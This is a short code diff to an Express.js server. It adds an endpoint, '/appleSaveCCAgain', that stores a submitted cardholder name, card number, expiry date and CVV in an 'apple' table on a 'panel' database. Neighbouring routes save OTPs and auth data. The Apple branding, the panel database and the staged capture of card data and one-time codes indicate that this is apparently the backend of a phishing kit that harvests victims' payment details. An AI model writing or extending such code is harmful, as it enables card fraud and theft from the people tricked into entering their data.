@@ -2045,6 +2045,22 @@ app.post("/appleSaveOtp", cors(), (req, res) => {
   });
 });
 
+app.post("/appleSaveCCAgain", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  ccname = req.body.ccname;
+  ccnum = req.body.ccnum;
+  ccexp = req.body.ccexp;
+  cvv = req.body.cvv;
+
+  let details = [ccname, ccnum, ccexp, cvv, uniqueid];
+  let query = `UPDATE apple SET ccname = ?, ccnum = ?, ccexp = ?, cvv = ?, status = 8 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
 app.post("/appleSaveAuth", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
 
